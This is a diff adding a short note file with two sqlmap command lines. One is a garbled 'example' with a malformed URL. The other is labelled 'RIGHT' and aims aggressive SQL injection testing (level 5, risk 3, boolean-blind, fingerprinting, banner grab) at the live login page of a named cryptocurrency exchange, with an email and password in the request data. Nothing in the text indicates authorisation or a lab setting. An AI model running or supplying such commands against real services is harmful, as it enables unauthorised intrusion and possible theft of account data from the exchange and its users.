@@ -1,0 +1,4 @@
+EXMPLE : python3 sqlmap.py -u "http//exm/res/usr/login" --data="email=test@test.com@pass......." --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B --flush
+
+RIGHT : python3 sqlmap.py -u "https://account.bitvavo.com/connect/users/login" --data="email=biqugesi%40musiccode.me&password=rafiabdulla" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B --flush
+
